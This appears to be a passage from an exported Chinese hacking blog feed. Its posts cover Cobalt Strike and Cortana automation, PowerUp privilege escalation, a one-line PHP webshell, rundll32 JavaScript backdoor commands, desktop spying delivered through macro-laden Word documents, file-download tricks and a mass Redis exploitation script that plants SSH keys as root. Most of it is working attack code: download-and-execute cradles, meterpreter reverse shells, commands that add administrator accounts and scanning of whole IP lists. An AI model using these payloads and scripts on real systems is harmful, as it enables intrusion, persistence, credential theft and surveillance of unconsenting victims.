http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c"); s_cmd($1, "gcc 44219.c -o rootme_1"); s_cmd($1, "chmod +x rootme_1"); s_cmd($1, "chmod 0777 rootme_1"); s_cmd($1, "./rootme_1"); sleep(10 * 1000); s_cmd($1, "chmod +x /tmp/linux_backdoor_$r_lport"); s_cmd($1, "chmod 0777 /tmp/linux_backdoor_$r_lport"); s_cmd($1, "chown root:root /tmp/linux_backdoor_$r_lport"); s_cmd($1, "/tmp/linux_backdoor_$r_lport"); s_cmd($1, "exit"); db_sync(); &#125; &#125; &#125;&#125; 0x08 小结使用Cortana脚本可以让我们更加便捷的使用Cobalt strike，并能更加方便的进行自动化攻击，希望对渗透测试中的你有所帮助。 0x09 参考 http://security-is-just-an-illusion.blogspot.com/2013/11/one-day-with-cortana-script-engine.html http://www.rvrsh3ll.net/blog/offensive/point-click-powershell-pwn/ https://www.veil-framework.com/veil-evasion-cortana-integration/ http://www.fastandeasyhacking.com/download/c/cortana_defcon.pdf http://blog.cobaltstrike.com/2013/03/13/howto-integrate-third-party-tools-with-cortana/]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>cortana</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powrshell 提权框架-Powerup]]></title>
    <url>%2Farchives%2FPowerup.html</url>
    <content type="text"><![CDATA[通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powershell框架-Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。 0x00 使用要使用Powerup，首先需要下载此脚本:Powerup，之后加载此脚本：12E:&gt; powershell.exe -nop -exec bypassPS E:\&gt; Import-Module .\PowerUp.psm1 加载完成以后，便可以使用Powerup中的所有模块了。通过如下命令可以查看所有模块：1PS E:\&gt; Get-Command -Module powerup 输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用”Get-help [cmdlet] -full“来查看，比如”Get-Help Find-DLLHijack -full“，如果要将输出的结果导出到一个文件可以使用Out-File，如下：1PS E:\&gt; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt 上述命令使用了Invoke-AllChecks，脚本将会进行所有的检查 在cmd环境下，可以使用下列方式来运行该脚本：1E:\&gt; powershell.exe -exec bypass -Command "&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;" 如果你想在内存加载此脚本，可以用下列方式：1E:\&gt; powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks" 除此之外，Metasploit上同样包含执行powershell脚本的模块exec_powershell.rb，通过此模块，可以通过msf会话来执行powershell。 0x01 模块介绍Find-DLLHijack检查每个进程所加载的模块，返回已经加载且不在其可执行目录的模块的目录。执行方式：123PS C:\&gt; Find-DLLHijack #返回所有的dll路径PS C:\&gt; Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles #返回排除C:\Windows\*； C:\Program Files\*；C:\Program Files (x86)\*以外的dll路径PS C:\&gt; Find-DLLHijack -ExcludeOwned #返回不属于当前用户所有进程权限的dll路径 Find-PathHijack检查当前%PATH%是否存在哪些目录是当前用户可以写入的。执行方式：1PS C:\&gt; Find-PathHijack Get-ApplicationHost从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码。执行方式：12PS C:\&gt;get-ApplicationHostPS C:\&gt;get-ApplicationHost | Format-Table -Autosize # 列表显示 Get-ModifiableFile检查某个文件当前用户是否拥有修改权限，并返回有权限的文件路径。执行方式：1PS C:\&gt; '"E:\temp\123123.xlsx" -f "C:\LibAntiPrtSc_ERROR.log"' | Get-ModifiableFile 前面为文件路径 Get-RegAlwaysInstallElevated检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的。执行方式：1PS C:\&gt; Get-RegAlwaysInstallElevated Get-RegAutoLogon检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。与msf windows_autologin.rb模块相同。执行方式：1PS C:\&gt; Get-RegAutoLogon Get-ServiceDetail返回某服务的信息。执行方式：1PS C:\&gt; Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息 Get-ServiceFilePermission检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的。执行方式：1PS C:\&gt; Get-ServiceFilePermission Get-ServicePermission检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象。执行方式：1PS C:\&gt; Get-ServicePermission Get-ServiceUnquoted检查服务路径，返回包含空格但是不带引号的服务路径，类似于msf的trusted_service_path.rb。此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。 比如C:\program files\hello.exe,会被解释为C:\program.exe以及C:\program files\hello.exe 执行方式：1PS C:\&gt;Get-ServiceUnquoted Get-UnattendedInstallFile检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括： c:\sysprep\sysprep.xml c:\sysprep\sysprep.inf c:\sysprep.inf c:\windows\Panther\Unattended.xml c:\windows\Panther\Unattend\Unattended.xml c:\windows\Panther\Unattend.xml c:\windows\Panther\Unattend\Unattend.xml c:\windows\System32\Sysprep\unattend.xml c:\windows\System32\Sysprep\Panther\unattend.xml 执行方式：1PS C:\&gt; Get-UnattendedInstallFile Get-VulnAutoRun检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。注册表检查的键值为：12345678HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServiceHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceServiceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServiceHKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService 执行方式：1PS C:\&gt; Get-VulnAutoRun Get-VulnSchTask返回当前用户能够修改的计划任务程序的名称和路径。执行方式：1PS C:\&gt; Get-VulnSchTask Get-Webconfig返回当前服务器上的web.config文件中的数据库连接字符串的明文。执行方式：12PS C:\&gt;get-webconfig PS C:\&gt;get-webconfig | Format-Table -Autosize #列表显示 Invoke-AllChecks执行所有的脚本来检查。执行方式：1PS C:\&gt; Invoke-AllChecks Invoke-Service Invoke-ServiceDisable 禁用服务 Invoke-ServiceEnable 启用服务 Invoke-ServiceStart 启动服务 Invoke-ServiceStop 停止服务 执行方式为：1PS C:\&gt; Invoke-ServiceDisable -ServiceName 服务名称。 Invoke-ServiceAbuse用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令。执行方式:1234PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Administrators" # 指定添加用户，用户密码以及添加的用户组。PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..." # 自定义执行命令 默认的账号可以通过修改默认参数来修改，如下图： Restore-ServiceBinary恢复服务的可执行文件到原始目录。执行方式：1PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC Test-ServiceDaclPermission 检查某个用户是否在一个服务有自由访问控制的权限，返回true或false。执行方式：1PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC Write-HijackDll输出一个自定义命令并且能够自删除的bat文件到$env:Temp\debug.bat，并输出一个能够启动这个bat文件的dll。执行方式：1PS C:\&gt; Write-HijackDll -OutputFile 'E:\temp\test.dll' -Command 'whoami' Write-UserAddMSI生成一个安装文件，运行这个安装文件，则弹出添加用户的框。执行方式：1PS C:\&gt; Write-UserAddMSI Write-ServiceBinary预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令。执行方式：1234PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组。PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -Command "net ..." # 自定义执行命令 Install-ServiceBinary通过Write-ServiceBinary写一个C#的服务用来添加用户。执行方式：1234PS C:\&gt; Install-ServiceBinary -ServiceName DHCPPS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -Command "net ..." Write-ServiceBinary与Install-ServiceBinary不同的是前者生成可执行文件，后者直接安装服务。 0x02 实战提权测试环境为win10。平常用的虚拟机，并没有特意去配置存在漏洞的环境，所以并不是所有的模块均可以使用。实际测试可以根据实际环境来调整。此次测试并未使用内核漏洞来提权。首先添加低权限测试账号，使用管理员身份运行cmd，添加测试账号：1C:\Windows\system32&gt;net user powerup 1 /add 查看powerup账号权限： 使用powerup账号登陆系统，加载Powerup： 执行Invoke-AllChecks:1PS E:\&gt; Invoke-AllChecks 执行以后找到下列问题：1234567891011121314151617181920212223242526[*] Checking for unquoted service paths...ServiceName : CDROM_DetectPath : C:\Program Files\4G USB Modem\4G_Eject.exeStartName : LocalSystemAbuseFunction : Write-ServiceBinary -ServiceName 'CDROM_Detect' -Path &lt;HijackPath&gt;ServiceName : hMailServerPath : C:\Program Files (x86)\hMailServer\Bin\hMailServer.exe RunAsServiceStartName : LocalSystemAbuseFunction : Write-ServiceBinary -ServiceName 'hMailServer' -Path &lt;HijackPath&gt;[*] Checking service executable and argument permissions...ServiceName : wampapachePath : "c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe" -k runserviceModifiableFile : c:\wamp\bin\apache\apache2.2.17\bin\httpd.exeStartName : LocalSystemAbuseFunction : Install-ServiceBinary -ServiceName 'wampapache'ServiceName : wampmysqldPath : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqldModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exeStartName : LocalSystemAbuseFunction : Install-ServiceBinary -ServiceName 'wampmysqld' 可以看出，Powerup列出了可能存在问题的服务，并在AbuseFunction中给了接下来的利用方式。在上面两个利用点可以看出，unquoted service paths中给出了两个路径带空格的文件路径，但是因为其在c盘，没有权限，所以并不能被我们利用来提权。而第二个检查通过Get-ServiceFilePermission找到两个当前用户可以写入相关联可执行文件的路径，我们就可以通过这个来进行提权。在AbuseFunction那里已经给了我们操作方式，接下来我们执行如下操作：1PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -UserName rockyou -Password 123 之后当管理员运行该服务的时候，则会添加我们的账号，运行前： 运行服务以后： 查看该账号权限： 当然，除了添加账号，我们同样可使用msf获得meterpreter会话。使用web_delivery 模块开启监听：12345678910111213msf &gt; use exploit/multi/script/web_delivery msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; /msf exploit(web_delivery) &gt; set lport 8888lport =&gt; 8888msf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set SRVPORT 8080SRVPORT =&gt; 8080msf exploit(web_delivery) &gt; set LHOST 192.168.74.1 msf exploit(web_delivery) &gt; exploit 执行如下命令：1PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.exe -nop -w hidden -c `$m=new-object net.webclient;`$m.proxy=[Net.WebRequest]::GetSystemWebProxy();`$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$m.downloadstring('http://192.168.74.1:8080/');" 要注意 $ 符号前面要加 ` 来转义 当管理员运行此服务以后则获取高权限的meterpreter会话 提权以后，使用Restore-ServiceBinary 恢复文件：1PS E:\&gt; Restore-ServiceBinary -ServiceName 'wampapache' 可以看到，我们使用powerup成功提权了。当然碰到实际的环境可以根据不同环境不同方式来进行提权。 0x04 小结Powerup提供了一些我们并不常见的提权方式，并且为我们的Windows提权提供了极大的方便，如果碰到未安装Powershell的计算机，可以详细参考Powerup里面的函数实现过程来通过别的方式来实现同样的效果，希望本文对你有帮助。]]></content>
      <categories>
        <category>渗透案例</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>powerup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最短php一句话]]></title>
    <url>%2Farchives%2Fphpcodes.html</url>
    <content type="text"><![CDATA[1&lt;?=`$_GET[1]`; 详细：http://drops.wooyun.org/papers/11718]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JSbackdoor]]></title>
    <url>%2Farchives%2F121.html</url>
    <content type="text"><![CDATA[//Execute A Command1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc"); //Write To A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fso=new%20ActiveXObject("Scripting.FileSystemObject");a=fso.CreateTextFile("c:\\Temp\\testfile.txt",true);a.WriteLine("Test");a.Close();self.close; //Read and Execute From A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();fso=new%20ActiveXObject("Scripting.FileSystemObject");f=fso.OpenTextFile("c:\\Temp\\testfile.txt",1);eval((f.ReadAll())); //Map A Remote Share (WEBDAV)1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";n=new%20ActiveXObject('WScript.Network');n.MapNetworkDrive("S:","https://live.sysinternals.com");self.close; //Map A Local Share1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";n=new%20ActiveXObject('WScript.Network');n.MapNetworkDrive("S:","\\\\Localhost\\c$");self.close; //Read and Execute Commands From A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();fso=new%20ActiveXObject("Scripting.FileSystemObject");f=fso.OpenTextFile("c:\\Temp\\Commands.txt",1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject("WScript.Shell");t.Run("cmd%20/c%20"%20+%20f.ReadLine(),null,true);&#125;; //Retrieve Commands From HTTP1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/a.txt",false);h.Send();B=h.ResponseText;alert(B); //POST results back to Server1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("POST","http://127.0.0.1:8081/a.php",false);h.Send("Stuff");]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Use Powershell Stream a target's Desktop]]></title>
    <url>%2Farchives%2FUse_Powershell_Stream_A_Target-t_Desktop.html</url>
    <content type="text"><![CDATA[最近Ninshang的作者又出了一个新的脚本，能够通过powershell对目标的屏幕进行实时监控。脚本地址如下：Show-TargetScreen.ps1 使用也很简单，脚本包括了reverse以及bind模式。下面是使用示例： 0x01 Bind模式：12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port 3333 然后在自己的计算机上使用火狐访问目标3333端口，结果如下图： 0x02 Reverse模式attacker：在这里可以使用创宇的py脚本转发：rtcp执行:1☁ rtcp [master] python rtcp.py l:5555 l:4444 监听本地5555端口以及4444端口。 之后在target执行：12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 5555 效果截图： 0x03 使用Powershell Client之前在乌云发过使用powershell Client进行有效钓鱼,在这里也是可以使用的，这里以Out-Word.ps1作为演示示例： 生成word文件:123PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL "http://192.168.74.1/Show-TargetScreen.ps1" -Arguments "Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666" 之后将Show-TargetScreen.ps1放在我们的web根目录：测试： 开启监听：1☁ rtcp [master] python rtcp.py l:6666 l:4444 当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13种方式下载文件]]></title>
    <url>%2Farchives%2F13-ways-to-download-a-file.html</url>
    <content type="text"><![CDATA[渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本：12$p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file","C:%homepath%file") 执行：1PS C:&gt; .test.ps1 如果Powershell禁止执行了，使用如下命令：1C:&gt;powershell set-executionpolicy unrestricted 0x02 Visual Basic创建如下VBS脚本。123456789101112Set args = Wscript.ArgumentsUrl = "http://domain/file"dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")dim bStrm: Set bStrm = createobject("Adodb.Stream")xHttp.Open "GET", Url, FalsexHttp.Sendwith bStrm .type = 1 ' .open .write xHttp.responseBody .savetofile " C:\%homepath%\file", 2 'end with 执行：1C:&gt;cscript test.vbs 0x03 Perl脚本如下:123#!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file"); 执行：1root@kali:~# perl test.pl 0x04 Python脚本如下：123456#!/usr/bin/python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close() 执行：1root@kali:~# python test.py 0x05 Ruby脚本如下：12345678#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("www.domain.com") &#123; |http|r = http.get("/file")open("save_location", "wb") &#123; |file|file.write(r.body)&#125;&#125; 执行：1root@kali:~# ruby test.rb 0x06 PHP脚本如下：1234567#!/usr/bin/php &lt;?php $data = @file("http://example.com/file");$lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?&gt; 执行：1root@kali:~# php test.php 0x07 FTP执行如下命令：1ftp 127.0.0.1 username password get file exit 0x08 TFTP执行如下命令：1tftp -i host GET C:%homepath%file location_of_file_on_tftp_server 0x09 Bitsadmin执行如下命令：1bitsadmin /transfer n http://domain/file c:%homepath%file 0x10 Wget执行如下命令：1wget http://example.com/file 0x11 Netcatattacker执行如下命令：1cat file | nc -l 1234 target执行：1nc host_ip 1234 &gt; file 0x12 Window 文件共享使用如下命令:1net use x: \127.0.0.1\share /user:example.comuserID myPassword 0x13 记事本： 打开记事本 文件，打开 在文件名处填入下载地址]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>download</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权批量提权脚本(python)]]></title>
    <url>%2Farchives%2Fhackredis.html</url>
    <content type="text"><![CDATA[安装依赖1☁ ~ sudo easy_install redis 使用12345678910111213☁ redis python hackredis.py usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT]For Example:-----------------------------------------------------------------------------python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22optional arguments: -h, --help show this help message and exit -l IPLIST the hosts of target -p PORT the redis default port -r ID_RSAFILE the ssh id_rsa file you generate -sp SSH_PORT the ssh port 首先需要ssh密钥:12☁ ~ ssh-keygen -t rsa☁ ~ cp ~/.ssh/id_rsa.pub /tmp/foo.txt 之后将ip列表填入ip.txt，然后就可以跑了。 成功的将会输出到success.txt,执行成功但是ssh连接失败的会存储在unconnect.txt，操作失败的会存储在fail.txt。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/usr/bin/python#coding:utf-8############################################################### @file hackredis.py #### @date 2015-12-11 #### @author evi1cg ###############################################################import redisimport argparseimport textwrapimport sysimport pexpectdef getargs(): parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\ For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22''')) parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target') parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port') parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate') parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port') if(len(sys.argv[1:]) / 2 != 4): sys.argv.append('-h') return parser.parse_args()def hackredis(host,port): ck = 0 try: print "[*] Attacking ip:%s"%host r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) r.flushall r.set('crackit',foo) r.config_set('dir','/root/.ssh/') r.config_set('dbfilename','authorized_keys') r.save() ck =1 except: print "\033[1;31;40m[-]\033[0m Something wrong with %s"%host write(host,2) ck =0 if ck == 1: check(host) else: passdef check(host): print '\033[1;33;40m[*]\033[0m Check connecting... ' try: ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port)) i = ssh.expect('[#\$]',timeout=2) if i == 0: print "\033[1;34;40m[+]\033[0m Success !" write(host,1) else: pass except: print "\033[1;32;40m[-]\033[0m Failed to connect !" write(host,3)def write(host,suc): if suc == 1: filesname = 'success.txt' elif suc ==2: filesname = 'fail.txt' elif suc ==3: filesname = 'unconnect.txt' else: pass file_object = open(filesname,'a') file_object.write(host+'\n') file_object.close()def main(): global foo,ssh_port paramsargs = getargs() try: hosts = open(paramsargs.iplist,"r") except(IOError): print "Error: Check your hostfile path\n" sys.exit(1) port = paramsargs.port ssh_port = paramsargs.ssh_port try: foo = '\n\n\n'+open(paramsargs.id_rsafile,"r").readline()+'\n\n\n' except(IOError): print "Error: Check your wordlist path\n" sys.exit(1) ips = [p.replace('\n','') for p in hosts] for ip in ips: hackredis(ip.strip(),port)if __name__ == "__main__": main()]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt strike3.0使用手册]]></title>
    <url>%2Farchives%2FCobalt_strike.html</url>
    <content type="text"><![CDATA[Cobalt strike3.0使用手册 0x00 简介Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。而Cobalt Strike 3.0已经不再使用Metasploit框架而作为一个独立的平台使用，当然可以结合Armitage进行使用。这里有一个破解版： 下载地址：戳我(自行验证其安全性) Cobalt Strike 3.0 延用了其强大的团体服务器功能，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。当然，在使用Cobalt Strike之前，需要安装java环境，具体怎么配置，请移步java环境搭建。 0x01 运行与之前版本的 Cobalt Strike不同， Cobalt Strike3.0需要开启团体服务器才可以链接使用，当然，这个服务器可以放到公网环境下，或者放到自己想要搭建此服务的环境中。下载好Cobalt Strike以后包含以下几个文件： 其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：1☁ cobaltstrike sudo ./teamserver 192.168.74.1 msf3 这里为了方便使用，最好使用具体的ip地址，而不是0.0.0.0或者127.0.0.1, 如果有多个网卡，使用你要用的那个ip地址即可，msf3 为该团体服务器的连接密码。 服务运行以后，在客户端进行连接：1☁ cobaltstrike java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $* 这里ip使用服务器的ip，端口默认50050，用户名随意，密码为之前设置的密码，然后connect,弹出验证窗口，然后点是，就进入Cobalt Strike了。 0x02 Listeners使用Cobalt Strike首先需要创建一个Listener,依次点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.0包括 windows/beacon_dns/reverse_dns_txt windows/beacon_dns/reverse_http windows/beacon_http/reverse_http windows/beacon_https/reverse_https windows/beacon_smb/bind_pipe windows/foreign/reverse_dns_txt windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp 其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。 0x03 Attacks创建好监听器，下面就需要配置客户端了，Cobalt Strike包括多种攻击方式，其中Packages包括如下几种： HTML Application 生成恶意的HTA木马文件；MS Office Macro 生成office宏病毒文件；Payload Generator 生成各种语言版本的payload;USB/CD AutoPlay 生成利用自动播放运行的木马文件；Windows Dropper 捆绑器，能够对文档类进行捆绑；Windows Executable 生成可执行exe木马；Windows Executable(S)生成无状态的可执行exe木马。 Web Drive-by（钓鱼攻击）包括如下几个模块： Manage对开启的web服务进行管理；Clone Site 克隆网站，可以记录受害者提交的数据；Host File 提供一个文件下载，可以修改Mime信息；PowerShell Web Delivery类似于msf 的web_delivery ;Signed Applet Attack 使用java自签名的程序进行钓鱼攻击;Smart Applet Attack 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；System Profiler用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。 Spear Phish 是用来邮件钓鱼的模块。 0x04 View View模块可以方便测试者查看各个模块，图形化的界面可以方便的看到受害者机器的各个信息。 Applications显示受害者机器的应用信息；Credentials显示受害者机器的凭证信息，能更方便的进行后续渗透；Downloads 文件下载；Event Log可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;Keystrokes查看键盘记录；Proxy Pivots查看代理信息；Screenshots查看屏幕截图；Script Console在这里可以加载各种脚本以增强功能，脚本地址戳我;Targets查看目标；Web Log查看web日志。 还有Reporting的功能就不介绍了，主要就是出报告用的。 0x05 BeaconBeacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。 通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用beacon了，右击电脑，Interact，则可打开Beacon Console; 在beacon处输入help，则可以看到详细说明：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273beacon&gt; helpBeacon Commands=============== Command Description ------- ----------- browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that's in-progress cd Change directory checkin Call home and post data clear Clear beacon queue covertvpn Deploy Covert VPN client desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target exit Terminate the beacon session getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over SMB logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode http Use HTTP as data channel mode smb Use SMB peer-to-peer communication net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powershell Execute a command via powershell powershell-import Import a powershell script ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host pth Pass-the-hash using Mimikatz pwd Print current directory rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward runas Execute a program as another user screenshot Take a screenshot shell Execute a command via cmd.exe sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host 对于某个模块的使用方式可以直接使用help查看，如：12345678910beacon&gt; help browserpivotUse: browserpivot [pid] [x86|x64] browserpivot [stop]Setup a Browser Pivot into the specified process. To hijack authenticatedweb sessions, make sure the process is an Internet Explorer tab. Theseprocesses have iexplore.exe as their parent process.Use "browserpivot stop" to tear down the browser pivoting sessions associated with this Beacon. 下面主要介绍几个好玩儿的功能。这里为了能快速显示结果，可以设置1beacon&gt;sleep 0 0x051 Browserpivot用户注入受害者浏览器进程，然后开启HTTP代理，之后就可以登录受害者登录的网站了。 使用方式，ps找到浏览器进程： 注入进程：1beacon&gt; browserpivot 3452 x64 设置本地浏览器代理： 